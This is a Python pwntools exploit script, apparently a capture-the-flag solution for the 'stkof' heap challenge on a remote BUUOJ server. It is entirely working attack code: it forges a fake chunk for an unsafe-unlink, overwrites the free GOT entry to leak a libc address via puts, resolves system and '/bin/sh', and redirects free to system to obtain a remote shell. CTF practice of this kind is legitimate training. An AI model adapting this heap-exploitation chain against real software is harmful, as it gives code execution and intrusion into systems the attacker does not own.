from pwn import *
#p = process("./stkof")
p=remote("node5.buuoj.cn",27559)
context.log_level = "debug"
elf = ELF("stkof")

def debug():
    gdb.attach(p)
    pause()

def allocated(size):
    p.sendline(b"1")
    p.sendline(str(size))
    p.recvuntil("OK\n")

def fill(idx,size,content):
    p.sendline(b"2")
    p.sendline(str(idx))
    p.sendline(str(size))
    p.sendline(content)
    p.recvuntil(b"OK\n")

def free(idx):
    p.sendline(b"3")
    p.sendline(str(idx))
    #p.recvuntil(b"OK\n")

allocated(0x10)  #chunk1
allocated(0x20)  #chunk2
allocated(0x90)  #chunk3
allocated(0x20)  #chunk4
allocated(0x80)  #chunk5
chunk_addr = 0x602140
payload1=p64(0)+p64(0x21)+p64(chunk_addr+0x10-0x18)+p64(chunk_addr+0x10-0x10)
payload1+=p64(0x20)+p64(0xa0)
fill(2,len(payload1),payload1)
free(3)
free_got=elf.got["free"]
puts_got=elf.got["puts"]
puts_plt=elf.plt["puts"]
print("free_got :",hex(free_got))
print("puts_got :",hex(puts_got))
payload2=p64(0)+p64(free_got)+p64(puts_got)
fill(2,len(payload2),payload2)
payload3=p64(puts_plt)
fill(0,len(payload3),payload3)
free(1)
puts_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("puts_addr :",hex(puts_addr))
libc=ELF("./libc-2.23.so")
libc_base=puts_addr-libc.sym["puts"]
sys_addr=libc_base+libc.sym["system"]
binsh_addr=libc_base+next(libc.search(b"/bin/sh\x00"))
print(hex(sys_addr))
print(hex(binsh_addr))
#debug()
payload4=p64(sys_addr)
fill(0,len(payload4),payload4)
payload5=p64(0)+p64(free_got)+p64(binsh_addr)
fill(2,len(payload5),payload5)
#debug()
free(1)
#debug()
p.interactive()
